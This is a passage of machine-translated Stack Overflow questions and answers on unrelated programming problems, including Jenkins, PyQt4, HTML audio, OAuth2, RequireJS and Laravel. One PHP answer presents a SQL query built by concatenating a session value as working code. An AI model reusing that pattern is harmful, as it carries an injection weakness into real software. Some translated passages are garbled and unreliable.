C:\IceBoX>java -jar c:\IceBoX\slave.jar -jnlpUrl http://XX.XX.XX.XX:8080/jenkins/computer/.../slave-agent.jnlp
Mar 20, 2013 3:31:59 PM hudson.remoting.jnlp.Main$CuiListener <init>
INFO: Hudson agent is running in headless mode.
Mar 20, 2013 3:31:59 PM hudson.remoting.jnlp.Main$CuiListener status
INFO: Locating server among [http://.....goldlnk.rootlnka.net:8080/jenkins/, http://XX.XX.XX.X:8080/jenkins/]
Mar 20, 2013 3:31:59 PM hudson.remoting.jnlp.Main$CuiListener status
INFO: Connecting to nhnaunxlbapp005.goldlnk.rootlnka.net:35204
Mar 20, 2013 3:31:59 PM hudson.remoting.jnlp.Main$CuiListener status
INFO: Handshaking
Mar 20, 2013 3:31:59 PM hudson.remoting.jnlp.Main$CuiListener error
SEVERE: unexpected stream termination
java.io.EOFException: unexpected stream termination
        at hudson.remoting.Channel.<init>(Channel.java:408)
        at hudson.remoting.Channel.<init>(Channel.java:366)
        at hudson.remoting.Channel.<init>(Channel.java:327)
        at hudson.remoting.Channel.<init>(Channel.java:323)
        at hudson.remoting.Channel.<init>(Channel.java:311)
        at hudson.remoting.Engine.run(Engine.java:238) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T21:34:03.237

首先，我要感谢 Gareth_Bowles，因为这些信息帮助我将 IT 推向了正确的方向。

当我们找到奴隶的电脑时，我们意识到它的硬盘空间已经用完了。这导致连接失败。我们删除了一些旧的存档构建历史，并能够将系统恢复到可运行状态。

我们还更新了 Jenkins 配置以在 30 天后删除构建数据。再次感谢您的帮助！

# html - 重新定位浏览器窗口时，为什么我的 HTML 表格会出现在彼此下方？

> ID：15533617
> 
> 赞同：0
> 
> 时间：2013-03-20T20:06:51.213
> 
> 标签：html, css, html-table

我正在制作一个网站，我正在为我的内容对齐表格。一个表格用于导航栏，其他表格用于其他内容。无论如何，我已将这些表设置为`float:left;`和`position:relative;`。

问题是，每当我重新定位浏览器窗口时，所有表格都会在最左边的表格下方移动。我该如何解决这个问题？我想要它，这样桌子就不会在彼此下方移动。

出于某种奇怪的原因，这个应用程序不允许我发布我的代码。我可以发布它，但它不会正确格式化整个内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:30:20.317

Watson 是正确的，包括 Diodeus 建议不要使用表格进行格式化。但是，您可以补救您遇到的情况的一种方法是将所有表格包装在一个包含元素（例如 a `div`）中，然后设置一个等于或略大于所有表格所需宽度的a`width`或css 参数`min-width`你的浮动桌子落入适当的位置。然后会发生什么，当窗口的大小调整为小于需要的大小时，您将获得一个水平滚动条，但元素的位置将保持不变。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:15:45.763

如果浮动表格的宽度大于其父表格的宽度（可用空间），则会发生这种情况。注意填充，边距，边框增加额外的宽度。并遵循 Diodeus 的建议，**不要使用表格进行布局**。

# centos - centos 6.4 64bit - yum：未定义符号：CRYPTO_set_locking_callback

> ID：15533620
> 
> 赞同：2
> 
> 时间：2013-03-20T20:07:04.210
> 
> 标签：centos, yum

嗨，我对 yum 有一点问题，我要求 yum 执行的任何命令都会得到这个错误的回报。我寻找了一个解决方案，但我还没有找到一个。

急需帮助

/usr/lib64/python2.6/site-packages/pycurl.so：未定义符号：CRYPTO_set_locking_callback

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T12:19:59.563

对 yum 命令执行 strace，您可能会看到它指向问题包或文件...

```
open("/usr/lib/nsr/libcurl.so.4", O_RDONLY) = 9 
```

你有安装网络器吗？如果是这样，请卸载它，删除所有 Networker RPM 并查看它是否仍然损坏。

nsr = 网络人

# python - PyQt4 中的多个类

> ID：15533625
> 
> 赞同：4
> 
> 时间：2013-03-20T20:07:09.257
> 
> 标签：python, class, inheritance, python-3.x, pyqt4

在学习了 Python 基础知识之后，我现在正在使用 PyQt4 在 GUI 中尝试自己。不幸的是，我现在一直在弄清楚如何使用多个课程，并且在花了很多时间试图在线获得答案并且没有真正找到正确的答案之后，我希望你现在可以帮助我。

所以这是我的示例代码：

```
import sys
from PyQt4 import QtGui, QtCore

class Example(QtGui.QWidget):

    def __init__(self):
        super(Example, self).__init__()

        self.initUI()

    def initUI(self):

        self.b1 = QtGui.QPushButton("Button", self)
        self.b1.move(100,100)

        self.setGeometry(300,300,200,200)
        self.setWindowTitle("Example")
        self.show()

class Bar(QtGui.QMainWindow):

    def __init__(self):
        QtGui.QMainWindow.__init__(self)

        self.initUI()

    def initUI(self):

        self.statusBar().showMessage("Statusbar")

def main():
    app = QtGui.QApplication(sys.argv)
    ex = Example()
    sys.exit(app.exec())

if __name__ == "__main__":
    main() 
```

现在只显示“Example”类中的 Button，但不显示“Bar”类中的 statusBar。那么我究竟如何才能同时使用这两个类呢？一个人必须从另一个人那里继承一些东西吗？对不起，如果这可能很笨拙并且有很多错误，但如果你能帮助我，谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:10:18.933

您需要实例化一个`Bar`对象，并调用它的`show`方法：

```
def main():
    app = QtGui.QApplication(sys.argv)
    ex = Example()
    bar = Bar()
    bar.show()
    sys.exit(app.exec_()) 
```

* * *

如果您希望按钮和状态栏在一个窗口中，请将所有小部件放在`QMainWindow`：

```
import sys
from PyQt4 import QtGui, QtCore

class Bar(QtGui.QMainWindow):

    def __init__(self):
        QtGui.QMainWindow.__init__(self)
        self.initUI()

    def initUI(self):
        self.setGeometry(300,300,200,200)
        self.b1 = QtGui.QPushButton("Button", self)
        self.b1.move(100,100)
        self.setWindowTitle("Example")
        self.statusBar().showMessage("Statusbar")

def main():
    app = QtGui.QApplication(sys.argv)
    bar = Bar()
    bar.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:32:43.040

一个 QMainWindow 有 QWidgets 和一个 QStatusBar，一个 QWidget 没有 QStatusBar。您需要修复继承树。

```
import sys
from PyQt4 import QtCore, QtGui

class Example(QtGui.QMainWindow):
    def __init__(self, parent=None):
        super(Example, self).__init__(parent)
        self.statusBar().showMessage("howdy stackoverflowers!!")

if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    ex = Example()
    ex.show()
    sys.exit(app.exec_()) 
```

# java - 带有 Java 的 Windows 文件属性

> ID：15533627
> 
> 赞同：1
> 
> 时间：2013-03-20T20:07:14.120
> 
> 标签：java, windows, properties, utf-8, filenotfoundexception

我正在尝试使用 Java 获取 Windows 文件属性。我试图获取的信息是详细信息下的信息，例如：作者、创建日期、标签、文件夹路径等。我尝试使用来自的答案：[阅读 Windows 文件摘要属性（标题、主题、作者）在 Java 中](https://stackoverflow.com/questions/4096973/reading-windows-file-summary-properties-title-subject-author-in-java)。

```
FileInputStream in = new FileInputStream("test.txt:\u2663SummaryInformation"); 
```

然而，当我尝试这个时，它给了我文件未找到异常。我已确保我要打开的文件存在。我还确保 Eclipse 处于 UTF-8 模式（对于“SummaryInformation”之前的俱乐部“\u2663”）。我也尝试过 UTF-8 模式。我不确定为什么会收到“未找到文件”异常。任何帮助，将不胜感激。

# ruby-on-rails - 使用 Rails Twitter gem 在 home_timeline 中抓取图像或搜索图像？

> ID：15533630
> 
> 赞同：0
> 
> 时间：2013-03-20T20:07:27.097
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2, twitter

我正在使用带有 Rails 3.0 的 Twitter gem，我想知道是否有人知道如何在 home_timeline 中定位图像。我知道如果一张图片与推文一起发布，它有一个链接，但我不知道从哪里开始搜索它。到目前为止，我所知道的一切都没有奏效。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-29T16:37:47.503

我假设您正在使用的`client.home_timeline`方法返回一个 Tweet 对象数组。然后只需使用 Ruby 数组方法`delete_if`来删除所有没有图像的推文（如果没有图像，我假设`tweet.media`将为零，但我不肯定）。数组中的其余推文都将具有可通过`tweet.media`实例方法访问的图像。代码会这样。 `client.home_timeline.delete_if {|tweet| tweet.media.nil?}`

# c# - 尝试从网络位置加载程序集

> ID：15533631
> 
> 赞同：1
> 
> 时间：2013-03-20T20:07:28.443
> 
> 标签：c#, .net

尝试对存储在网络位置的 WCF 服务库项目执行 F5 时收到该错误消息。

我已将以下内容添加到我的 app.config 和 devenv.exe.config 中：

```
<configuration>
  <runtime>
    <loadFromRemoteSources enabled="true"/>
  </runtime>
</configuration> 
```

仍然没有帮助。这些文件都不是来自外部站点。它实际引用的 .dll 是项目在构建时创建的同一个 .dll 文件......所以我不知道为什么它现在不能引用同一个 .dll。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:23:30.543

[在 C# 中从共享网络驱动器加载 dll](https://stackoverflow.com/questions/13586128/load-a-dll-from-shared-network-drive-in-c-sharp)

看到那个答案。看起来您需要将该位置添加到您正在使用的机器上的受信任位置列表中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-07-12T12:14:08.150

我今天也遇到了同样的问题。

尝试托管 Wcf 服务的应用程序不是**devenv.exe**，而是**WcfSvcHost.exe**。

它的位置是“C:\Program Files\Microsoft Visual Studio **XX** .0\Common7\IDE”（当然，将 XX 替换为您的 Visual Studio 版本）。

您可以简单地添加**WcfSvcHost.exe.config**文件**`<loadFromRemoteSources enabled="true"/>`**的运行时部分，它应该可以工作。

 **不幸的是，同样的错误消息可能与其他问题有关，但我想这正是你的实例，因为它是我的实例。**

# javascript - 地理编码器返回 ZERO_RESULT 和 QUERY_LIMIT_REACHED

> ID：15533634
> 
> 赞同：0
> 
> 时间：2013-03-20T20:07:35.420
> 
> 标签：javascript, geocode

好的，所以我构建了一个工作（几乎）地理编码器，它接受地址或纬度/经度组合，并建议结果见此处：

```
$(this).autocomplete({

        source:function (request, response) {

            if (geocoder == null) {
                geocoder = new google.maps.Geocoder();
            }
            geocoder.geocode({'address':request.term }, function (results, status) {

                if (status == google.maps.GeocoderStatus.OK) {
                    var searchLoc = results[0].geometry.location;
                    var lat = results[0].geometry.location.lat();
                    var lng = results[0].geometry.location.lng();
                    var latlng = new google.maps.LatLng(lat, lng);
                    var bounds = results[0].geometry.bounds;

                    geocoder.geocode({'latLng':latlng}, function (results1, status1) {
                        if (status1 == google.maps.GeocoderStatus.OK) {
                            if (results1[1]) {
                                response($.map(results1, function (loc) {
                                    return {
                                        label:loc.formatted_address,
                                        lat:lat,
                                        lng:lng,
                                        value:loc.formatted_address,
                                        bounds:loc.geometry.bounds
                                    }
                                }));
                            }
                        }
                    });
                }
            });
        }, 
```

并且 90% 的时间它都非常有效。但是，我现在注意到有时它在弹出列表中返回的第一项是不可点击的。我已经为变量设置了日志，`status`并注意到它偶尔是`ZERO_RESULT`或`QUERY_LIMIT_REACHED`。在这两种情况下，列表都会加载值，并且列表中的所有内容都是可选的，除了第一个。任何可能的解决方案的想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:26:05.297

看起来有些实例`bounds`被 API 遗漏了，因此在我的代码中定义为`undefined`. 这导致代码进一步出现 javascript 问题，并阻止满足条件。看起来甚至不需要正确构建地图，我已经解决了我的问题......

# html - 在隐藏标签中播放声音

> ID：15533636
> 
> 赞同：18
> 
> 时间：2013-03-20T20:07:43.630
> 
> 标签：html, audio

我正在尝试在网页上设置声音。

我找到了这段代码。它在可见时是工作代码，`div`但我想隐藏并工作。在这种情况下，它不起作用，因为它被`style`属性隐藏了。如何使它不可见并同时播放声音？

```
<div style="display:none">
   <embed src="sound.mp3"/> 
</div> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-20T20:13:54.707

我同意上面评论中的观点——这**可能**很烦人。我们只能希望您给用户关闭音乐的选项。

然而...

```
audio { display:none;}
```

```
<audio autoplay="true" src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Example.ogg">
```

css 隐藏`audio`元素，并`autoplay="true"`自动播放它。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2017-01-28T03:49:49.067

我一直在尝试附加一个应该自动播放并将被隐藏的音频。这很简单。只需几行 HTML 和 CSS。看一下这个！！这是我在正文中使用的一段代码。

```
<div id="player">
    <audio controls autoplay hidden>
     <source src="file.mp3" type="audio/mpeg">
                unsupported !! 
    </audio>
</div> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-19T08:08:55.533

`<audio autoplay> <source src="file.mp3" type="audio/mpeg"> </audio>`

它删除了自动播放栏，但仍然播放音乐。看不见的声音！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-01-21T15:44:46.213

这就是我实现它的方式，这是不可见的（*可怕的声音......*）

```
<!-- horrible is your mp3 file name any other supported format.-->
<audio controls autoplay hidden="" src="horrible.mp3" type ="audio/mp3"">your browser does not support Html5</audio> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-08-07T03:38:11.110

```
audio { display:none;}
```

```
<audio autoplay="true" src="https://upload.wikimedia.org/wikipedia/commons/c/c8/Example.ogg">
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-02-24T05:05:46.163

我希望人们允许他们关闭诸如音乐之类的东西，至于按钮点击，有时，这些非常酷。使用

`<audio controls autoplay hidden="hidden"> <source src="*file here*" type="*file extension (.mp3 .ogg etc.)*"> <!--This displays an error to users that don't have it supported--> Your browser does not support the audio element. </audio>`

如您所见，我不喜欢重复自己，但我决定使用`hidden`标签。

希望这可以帮助。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-07-08T00:03:10.200

```
<audio id="audio" style="display:none;" src="mp3/Fans-Mi-tooXclusive_com.mp3" controls autoplay loop onloadeddata="setHalfVolume()"> 
```

即使系统音量很高，它也会自动播放、隐藏音乐并减少音乐以避免噪音。把它放在脚本中：

```
<script>
    function setHalfVolume() {
        var myAudio = document.getElementById("audio");
        myAudio.volume = 0.2;
    }
</script> 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-05-21T15:19:16.363

通常，我所做的是放置正常的音频标签，然后放置`autoplay="true"`并且我不添加：controls =“true”，这通常对我有用

[我把它放在一个片段中，还在这里](https://jsfiddle.net/Foxygaming9978/0teazcs5/)做了一个 jsfiddel

希望这可以帮助 ：）

```
<audio autoplay="true" 
src="https://res.cloudinary.com/foxyplays989/video/upload/v1558369838/LetsGo.mp3"> 
</audio>
```

# asp.net - 在 Asp .Net 中用 Google Oauth2 代码换取 Oauth2 令牌

> ID：15533640
> 
> 赞同：0
> 
> 时间：2013-03-20T20:07:54.657
> 
> 标签：asp.net, oauth-2.0, token, google-oauth

我已经检查了 stackoverflow 并尝试了几种解决方案，但是在尝试向 google 令牌服务器发出发布请求以将代码换成 oauth2 令牌时，我继续得到 400。该代码正在从查询字符串中正确检索。我已经尝试过对秘密进行 URL 编码、重定向 URL 并将请求的编码更改为 ASCII。我知道 google 对标头很挑剔，但 json 响应故意含糊不清，只返回“错误：错误请求”我无法调试请求有什么问题。我还尝试在 chrome REST 客户端中测试发布请求并收到相同的错误。我假设标题中存在错误或其他格式问题，但谷歌没有返回有用的错误代码。

//用工作代码编辑

```
 //trade code for token
    public static String CodeTrade(String code)
    {
        String apiResponse;

            string codeClient = "code=" + code + "&client_id=xxx.apps.googleusercontent.com&";
            string secretUri = "client_secret=zzz&grant_type=authorization_code&redirect_uri=" + "https://web.locusvisual.com/gadgets/smallview/loginTrue.aspx";
            string postData = codeClient + secretUri;
            // Create a request using a URL that can receive a post. 
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://accounts.google.com/o/oauth2/token");

            // Set the Method property of the request to POST.
            request.Method = "POST";
            // Set the ContentType property of the WebRequest.
            request.ContentType = "application/x-www-form-urlencoded";

            // Create POST data and convert it to a byte array.
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);

                // Get the request stream.
                Stream dataStream = request.GetRequestStream();

                // Write the data to the request stream.
                dataStream.Write(byteArray, 0, byteArray.Length);

                // Close the Stream object.
                dataStream.Close();

                // Get the response.
                WebResponse response = request.GetResponse();

                // Display the status.
                apiResponse = ((HttpWebResponse)response).StatusDescription.ToString();
                //Console.WriteLine(((HttpWebResponse)response).StatusDescription);

                // Get the stream containing content returned by the server.
                dataStream = response.GetResponseStream();

                // Open the stream using a StreamReader for easy access.
                StreamReader reader = new StreamReader(dataStream);

                // Read the content.
                string responseFromServer = reader.ReadToEnd();
                // Display the content.
                Console.WriteLine(responseFromServer);
                // Console.ReadKey();
                // Clean up the streams.

                apiResponse = responseFromServer;
                reader.Close();
                dataStream.Close();
                response.Close();

        return apiResponse;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-01T22:22:23.317

在我看来，您的 urlencoding 可能搞砸了。您对 locovisual.com URL 进行 urlencode，但仅此而已。400 可靠地意味着您的请求在语法上有些混乱。

# javascript - 如何使 Chrome 输入无法选择（但允许编辑）？

> ID：15533641
> 
> 赞同：2
> 
> 时间：2013-03-20T20:07:56.353
> 
> 标签：javascript, jquery, html, google-chrome, cross-browser

代码：

```
(function($){
    $.fn.ctrl = function(key, callback) {
    if(typeof key != 'object') key = [key];
    callback = callback || function(){ return false; }
    return $(this).keydown(function(e) {
        var ret = true;
        $.each(key,function(i,k){
            if(e.keyCode == k.toUpperCase().charCodeAt(0) && e.ctrlKey) {
                ret = callback(e);
            }
        });
        return ret;
    });
};

$.fn.disableSelection = function() {
    $(window).ctrl(['a','s','c']);
    return this.each(function() {           
        $(this).attr('unselectable', 'on')
               .css({'-moz-user-select':'none',
                    '-o-user-select':'none',
                    '-khtml-user-select':'none',
                    '-webkit-user-select':'none',
                    '-ms-user-select':'none',
                    'user-select':'none'})
               .each(function() {
                    $(this).attr('unselectable','on')
                    .bind('selectstart',function(){ return false; });
               });
    });
};

})(jQuery);

$(document).ready(function(){
    $("textarea").on('focus',function(){
        $(this).disableSelection();
    });
}); 
```

小提琴：http: [//jsfiddle.net/EBhya/8/](http://jsfiddle.net/EBhya/8/)

它背后的想法是用户可以输入，但不能突出显示文本。仍然可以使用箭头键进行更改等。

在 Firefox 和 IE 上，这可以**100%**正常工作。

在 Chrome 上，可能在 Safari 上，当您专注于输入时，输入被禁用，您甚至无法输入。

我已经尝试了一切，从等到`keydown`应用禁用的选择，到尝试监视鼠标点击和选择。无论如何，如果有人可以提供帮助，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:57:04.000

正如 bfavaretto 建议的那样，这可以解决问题：[https ://stackoverflow.com/a/4656495/825789](https://stackoverflow.com/a/4656495/825789)

# ios - 在 ios6 中捕获推送通知

> ID：15533643
> 
> 赞同：0
> 
> 时间：2013-03-20T20:07:59.707
> 
> 标签：ios, sms, jailbreak

我正在为越狱的 ios6 设备开发一个扩展，该设备需要捕获传入的 SMS 消息/其他消息传递应用程序。有没有图书馆甚至有办法做这样的事情？

我从中获得灵感的例子是 GV SMS 扩展。 [https://github.com/mrzzheng/GVExtensions](https://github.com/mrzzheng/GVExtensions)

# c - 如何在内核中使用拷贝输出？

> ID：15533646
> 
> 赞同：1
> 
> 时间：2013-03-20T20:08:04.260
> 
> 标签：c, operating-system, bsd

在内核空间中，我想从终端复制一个字符并将其放入用户空间。

我正在尝试这段代码，但它不起作用：

```
char mychar;
int result;
mychar = getch();
result = copyout(&mychar, chptr, sizeof(mychr)); 
```

（`chptr`是指向用户级空间的指针）

`copyout`不返回 1\. 有谁知道问题是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:18:54.633

假设一个 BSD-ish `copyout`：

```
RETURN VALUES
     The copy functions return 0 on success or EFAULT if a bad address is
      encountered. ... 
```

换句话说，你只是在期待它返回的东西。:-)

# object - 调用未定义的方法 mysqli::fetch_object()

> ID：15533648
> 
> 赞同：1
> 
> 时间：2013-03-20T20:08:12.663
> 
> 标签：object, fetch

下午好！

我需要以下代码的帮助，它有一个错误！真正的我是新来的。

```
Error: Call to undefined method mysqli::fetch_object() 
```

代码是：

```
 $mysqli=conectar(); 
       $sql="SELECT nombre FROM admin WHERE user=".$_SESSION['admin']; // carga el nombre del usuario de la sesión
       $resultado = $mysqli->query($sql);
       $linea=$mysqli->fetch_object($resultado);
        echo $linea; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:13:02.910

错误是您在 mysqli 对象上调用方法 fetch_object() 。fetch_object（OO 风格）的签名是：

```
object mysqli_result::fetch_object ([ string $class_name [, array $params ]] ) 
```

`mysqli_result`因此，您必须在对象上调用该方法。它应该是这样的：

```
 $mysqli=conectar(); 
 $sql="SELECT nombre FROM admin WHERE user=".$_SESSION['admin']; // carga el nombre del usuario de la sesión
 $resultado = $mysqli->query($sql);
 $linea=$resultado->fetch_object();
 echo $linea->nombre; //retrieve the field 'nombre' 
```

这对我来说很好。

# c# - MVC 应用程序中的 Require.js

> ID：15533654
> 
> 赞同：0
> 
> 时间：2013-03-20T20:08:27.373
> 
> 标签：c#, javascript, asp.net-mvc-4, requirejs

出了点问题，我想不通。

`_Layout.cshtml`拥有：

```
 <body>
      <script data-main="Scripts/main" 
          src="@Url.Content("~/Scripts/require.js")" 
          type="text/javascript">
      </script>

      @RenderSection("scripts", required: false)
</body> 
```

/脚本/main.js：

```
require.config({
   paths: {
       "jquery": "jquery-1.9.1"
   }
}); 
```

一直到 index.cshtml：

```
@section scripts
{
    <script type="text/javascript">
        require(['jquery'], function ($) {

        });
    </script>
} 
```

它抛出 404 试图找到 jquery.js。我究竟做错了什么？

upd：是的 main.js 被调用，如果注释 index.cshtml 中的所有内容并将其放在 main.js 的末尾，则类似于

```
require([
    'jquery'
], function ($) {
   $(function(){
      alert('jquery loaded');
   })
}); 
```

它显示了消息

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:16:56.907

我突然想到你的问题是什么。您正在使用应该使用地图的路径。

尝试以下操作，它会将您的 jquery 文件映射到您的短名称。

```
require.config({
   baseUrl: '/scripts',
   map: {
       "jquery": "jquery-1.9.1.js"
   }
}); 
```

此外，如果您点击 index 很有可能没有及时加载您的 requirejs 文件。如果您首先在索引中声明它，我认为这将防止出现竞争条件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:17:27.570

[@David L 是正确的。](https://stackoverflow.com/questions/15533654/require-js-in-mvc-app#comment22005866_15533654)

当 index.cshtml 中脚本块内的 javascript 运行时，您的`require.config`块可能尚未运行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-21T03:24:56.640

看来你应该将脚本部分放在_Layout.cshtml的head标签中，main.js的引用通常在head中，所以之前调用了config，我想这就是原因。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:30:53.537

所以我最终从页面中删除`data-main`属性`_Layout.cshtml`并直接从页面调用 main：

```
@section scripts
{
    <script type="text/javascript">
        require(['Scripts/main'], function () {
            require([ "views/home-index"] );
        });
    </script>
} 
```

# clojure - 与其他 Clojure Web 框架相比，Pedestal 有哪些功能？

> ID：15533656
> 
> 赞同：20
> 
> 时间：2013-03-20T20:08:30.157
> 
> 标签：clojure, web-frameworks, pedestal

最近，Relevance 发布了[Pedestal](http://pedestal.io)，这是 Clojure 的新 Web 框架。

该框架与 Compojure、Webjure、Conjure、Mustache 等其他 Clojure Web 框架相比，在功能、应用程序开发的易用性、开发人员工具等方面有何不同？

请参阅[Clojure Web 框架的比较](https://stackoverflow.com/questions/3325033/comparison-of-clojure-web-frameworks)

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-26T13:34:50.403

我的看法是，Pedestal 更多的是从架构的角度分离关注点，而不是功能集：

*   服务器和客户端的 Clojure（通过 ClojureScript）允许您将代码（以及逻辑）放在最有意义的地方
*   http请求通过拦截器抽象与服务器中的特定线程解耦
*   将应用程序逻辑与渲染关注点分开
*   通过数据流对应用程序中的状态更改进行渲染控制

这些东西在应用程序的生命周期中是很大的优势。话虽如此，它是 alpha 级别并且可能会发生变化，并且数据流的控制有点不同，所以就像任何新事物一样，有一个学习曲线。

如果您查看文档并收听 [此处](http://thinkrelevance.com/blog/2013/03/18/pedestal-podcast-episode-027)的播客，就会清楚很多。希望有帮助。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-03-20T20:26:06.423

另一件事是，与 Ring 相比，Pedestal 允许在多个线程中处理一个请求。它的环兼容拦截器模型允许这样做：http: [//pedestal.io/documentation/service-interceptors/](http://pedestal.io/documentation/service-interceptors/)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-03-20T20:16:13.893

据我所知，Pedestal 是唯一一个便于在服务器端和客户端使用 Clojure 的框架，后者由于 Clojurescript 而成为可能。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-10-03T08:50:44.133

As the author of Clojure on Coils I would actually say Pedestal is a safer bet right now, as Clojure on Coils main feature which is Backtracking code is not ready yet. Backtracking code means that you can click on an element on the web page and it can show you the whole call stack and code tree that built that element (right now it only shows you the code that generated the HTML and does not go deeper).

## Update

The backtracking code is now implemented

# sorting - 使用 Eloquent 对数据进行排序

> ID：15533659
> 
> 赞同：12
> 
> 时间：2013-03-20T20:08:39.913
> 
> 标签：sorting, laravel

我是 laravel 的新手（从 CI 切换），雄辩的 ORM 在某些时候仍然有点神秘！

这是我的问题：

我想使用 Eloquent 对我的数据库中的数据进行排序。

我有一个表**帖子**和一个表**评论**（帖子有很多评论，评论属于帖子）

每条评论都有一个时间戳（=> created_at 字段），我想订购如下：

（我们在配置文件页面上，所以 $user->id 是用户的 id（显然））

**我想要该用户发表评论的帖子中的每篇帖子，并按评论的 created_at 字段对所有这些帖子进行排序**

我真的很想完全使用 Eloquent，或者至少是 Fluent，但我不知道这样做的正确方法。

我希望我是清楚的，并感谢您的时间！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-10-10T00:10:36.950

我刚刚在我正在开发的项目中遇到了同样的问题。在我所见的任何地方，我都看到了`usort()`or`uasort()`作为解决此问题的建议方法。（[`Collection::sort()`](http://laravel.com/api/class-Illuminate.Support.Collection.html#_sort) 只是一个包装器`uasort()`）但这并没有让我满意，因为当 SQL 应该使用 ORDER BY 子句为我进行排序时，我为什么要使用 PHP 进行排序？我最终使用 getXXXAttribute() 方法以这种方式实现它：

```
class Post extends Eloquent {
    public function comments()
    {
        return $this->hasMany('Comment');
    }

    public function getCommentsAttribute()
    {
        $comments = $this->comments()->getQuery()->orderBy('created_at', 'desc')->get();
        return $comments;
    }
    ...
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-30T08:55:38.553

我之前也遇到过同样的问题，但这是一对一的关系。这篇[文章](https://stackoverflow.com/questions/15252444/how-to-order-by-on-second-table-when-using-eloquent-one-to-many)帮助了我。我最终使用了一个连接。我的代码是这样的：

```
$data = Posts::join('comments', 'comments.post_id', '=', 'posts.id')
        ->order_by('comments.created_at')
        ->get(array('comments.field1 as field1', 'posts.field2 as field2')); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T08:37:01.237

这样的事情可能会有所帮助。

```
$content = Posts::with(array('comments' => function($query) {
               $query->order_by('created_at', 'asc');
            }))
            ->get(); 
```

或者，如果您的问题更复杂：

[如何在 Eloquent ORM 中按多对多关系的数据透视表的字段进行排序](https://stackoverflow.com/questions/14299945/how-to-sort-by-a-field-of-the-pivot-table-of-a-many-to-many-relationship-in-eloq)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-11-11T17:11:13.923

如果您在用户类中定义了关系，那么您可以通过评论获取所有帖子。它返回一个提供 sortBy() 和 sortByDesc() 函数的集合。这两个函数都将接受一个回调，您可以在其中自己选择排序方法。

```
$posts = $user->comments->post->sortByDesc(function($post) {
    return $post->created_at;
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-25T18:35:16.793

您面临的问题是因为您定义的关系只是为您提供与帖子相关联的评论，并且对该结果的“排序依据”只会对评论进行排序，因为评论是出来的，所以你可以做的是在评论模型中定义“评论”属于“帖子”，然后找到评论与哪个帖子相关联，然后使用[**usort()**](http://php.net/manual/en/function.usort.php "**排序**")函数运行手动比较一个例子是（我在 Laravel 3 中编写代码，但你可以为任何其他版本重写它）：

因此，假设您的 Comments 表有一个名为**postID**的外键，它定义了与 Posts 表的关系，并且 Posts 表中的 Timestamp 是默认**created_at**，并且 Users 表使用外键**userid**连接到 Comments 表，

```
 $userid = $user->id;
    $comments = Comments::where_userid($userid);
    function commentsort($first, $second){
      if (getCommentPost($first) == getCommentPost($second)) {
        return 0;
      }
     return (getCommentPost($first) < getCommentPost($second)) ? -1 : 1;
    }

    function getCommentPost($comment){
    return Post::where_postid($comment->postid)->first()->created_at;
    }

    usort($comments, "commentsort"); 
```

这应该有助于解决这个问题，实际上这不包含在 Laravel 中，因为它是一个框架，并且执行特定功能的这些功能通常不包含在框架中，因为使用范围有限，据说你也可以包括默认数据库类中的这个函数，以便在项目中普遍使用这个功能。

# android - 使用 GSON 从 JSP 获取数据到 android

> ID：15533667
> 
> 赞同：-1
> 
> 时间：2013-03-20T20:08:57.260
> 
> 标签：android, jsp, android-activity, gson, http-get

我有 2 个活动用于从 .jsp 文件获取数据到 android 设备。我为此使用 GSON。我的项目包括 gson 库。问题是，当我启动活动时，应用程序失败了，并向我显示：不幸的是，应用程序停止了。

主要活动：

```
public class MainActivity extends Activity {

    TextView capitalTextView;
    ProgressDialog progressDialog;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);    
        setContentView(R.layout.main);
        capitalTextView = (TextView) findViewById(R.id.capital_textview);

        this.retrieveCapitals();
    }

    void retrieveCapitals() {

        progressDialog = ProgressDialog.show(this,
                "Please wait...", "Retrieving data...", true, true);

        CapitalsRetrieverAsyncTask task = new CapitalsRetrieverAsyncTask();
        task.execute();
